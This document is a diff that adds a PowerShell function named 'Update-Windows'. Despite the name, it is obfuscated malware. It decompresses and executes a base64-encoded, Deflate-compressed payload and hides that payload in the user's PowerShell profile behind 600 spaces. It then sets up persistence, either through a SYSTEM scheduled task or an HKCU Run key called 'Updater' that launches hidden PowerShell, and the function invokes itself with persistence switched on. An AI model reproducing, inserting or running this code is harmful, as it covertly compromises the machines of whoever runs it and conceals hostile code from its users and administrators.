@@ -1,0 +1,16 @@
+function Update-Windows{
+Param([Switch]$Persist)
+$ErrorActionPreference='SilentlyContinue'
+$Script={sal a New-Object;iex(a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String('vVb7b9pIEP45lfo/WBUSRiHYpDRNIkW6NdjBBAccB/M6dDL22t6wftReh0ev//uNwSTkmlS5O+ksJPYxj2+/mdlZNwttRqKQe+h6CnXmrNXvBdz3jx+O+lZiBRxfstzYqAePYpUrsZ5UOTqCvZLdk/rj2O7NuSuOn6I4bkWBRcLZ5WUzSxIcst28do0ZSlMczCnBKV/h/uSGPk7wSW/+gG3GfedKf9SuaTS3aCG2blq2j7kTFDr5XjeyrRxezYgpYXz599/LlelJfVaTv2UWTfmysU4ZDmoOpeUK96OSO7xfx5gva8ROojRyWW1Iws+ntUGYWi6+BWuPWMPMj5y0XIGjwC/BLEtC7vlQuZWdDF+GYT+JbOQ4CU5BpaaGj9EC86Uwo7TK/cZPCwh3WchIgGGf4SSKDZw8EhuntbYVOhTfYXfG3+Ll/uTvVeIPlUCqz5JKFaLyFlYtcjKKd+rlys9on8JZga8IKdDw4+OHjx/cfS5EX5eO0RYHG+aGh7kAo6PpdowBLt+PUrKVv+IgOzTwabEoWcO0dJ9kuDLjpnksprMZVyKbSXfcQ8vFHQqqb9up75VAxW/37G8X9Rtz9QV2pmZEnBloFkErETbRzm7rcyfffDsDW9glIW6tQysg9j7J+NdCgV2Kt+ev7cVuASBfLjaw08IUexbLea1y05/V5ICwJ10pI9TBCbIhnCmggkhXXoLZhYovq6GGA+BtNy9DUFxIbbyXLtJ5vfeez0Go3KRWmla5fga1ZVc5A1sUO1UOhSkptlDGou2w/AxXyygjtpWyvblZ5QWZhdNmFKYsyWyIJxBwb8TYJhbN+ahybeJgaW0Qb++8/CobTYtSEnpg6RGiASs5CwbLsyQBnC8yolIzMFODmOIAZLcVr1DLg/ouCmSbXpaHnfKrcPcFsMv2nJ09LQdgIeQGjViVM0nC4PbImT7Isf8G6eAaeQbXTHARMH5fY1NpzfKKKLFEJRfogvW/fSV5BhcEbulKGFClJFEgWSk+axgsASL5T4JMWl/6rWiD4JOVO92UjIE5UTWnQw2VGWOZdAe+r5K66sF8PZC9PhPjm/v7dsdotVHSWvkuUlNVbktrvS4hu02+mh1pMAA90uzqDysVOVLgjbxxc6n2/ZEKjppdT/XgX1J9WxInoieJSrNrSL5MROQZeltv1CeqcE4lsjFUA7WHT/6e/MiNRnu0uke3Wgf5Ss9R6qfKVn+R608W192WvJ3b+VwfpzKRwY+sjHXTx0MzloayMtHNWPWOl55udoWG4kuwrpJVNzYE+Or1zmPobDR6vtEArm5OOgRPVA+vPaQjZIxDasyXTSQpzvLGk+hAGcDa4l4NV/o81pz1uC1cmBrBcYR0GSGFQgUHyFq2hPowUnTziz6QxdV6IK6W8oOwlElnuSj+B9dnZ57gNvqCaahh2/IlwLvuNBakcwx7gWWKY1cwc/6ai1DYhCN61tG2nMJ5dNAhOWeWdwd6Ox3EQnUkCKYneMilpuqd694oCk+tBdgeeggQwhkh1m5H1WzASslicDwS6gPAIwadlZhjDTrnYO908YpNwwdunYmFpByHNLyO0HBxfdZcn/c1OIdZB5uhmd0P22ATMGeL85xmiG/LaIbXhjo6deZ3knDsjC1PmmTHyLnxYok4iVDXr64+5UUBVVGiXvv2IL/fanialaS+RSHvoYnt7yYlSpSiJ/Ujkmvw/It3ygInIabQ3aH/78saURrZeY980cWgT++65wwuqwEMP5++OqpwT4KV5/a5X7q8nADqvG0eVG+ti0OP+VVx9VkUoRGKq4YIp3//iZtRvOZfmKzmDXVL3d990a2vSn6VlDYt1wkbk/+H3eIu8+HPeS+7z2u/2H0X42J1x8ZPyy8X/hHt/5qKoUUYaBhwKVO8e0T8mpEitQ6eY0XoIGfc4svfxr2MndzCQ+0v'),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()}
+if($Persist){
+if(([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator'))
+{$Prof=$PROFILE.AllUsersAllHosts;$Payload="schtasks /Create /RU system /SC DAILY /ST 20:15:00 /TN Updater /TR `"$($Env:SystemRoot)\System32\WindowsPowerShell\v1.0\powershell.exe -w hidden -NonInteractive`""}
+else
+{$Prof=$PROFILE.CurrentUserAllHosts;$Payload='New-ItemProperty -Path HKCU:Software\Microsoft\Windows\CurrentVersion\Run\ -Name Updater -PropertyType String -Value "`"$($Env:SystemRoot)\System32\WindowsPowerShell\v1.0\powershell.exe`" -NonInteractive -WindowStyle Hidden"'}
+mkdir (Split-Path -Parent $Prof)
+(gc $Prof) + (' ' * 600 + $Script)|Out-File $Prof -Fo
+iex $Payload|Out-Null
+Write-Output $Payload}
+else
+{$Script.Invoke()}
+} Update-Windows -Persist
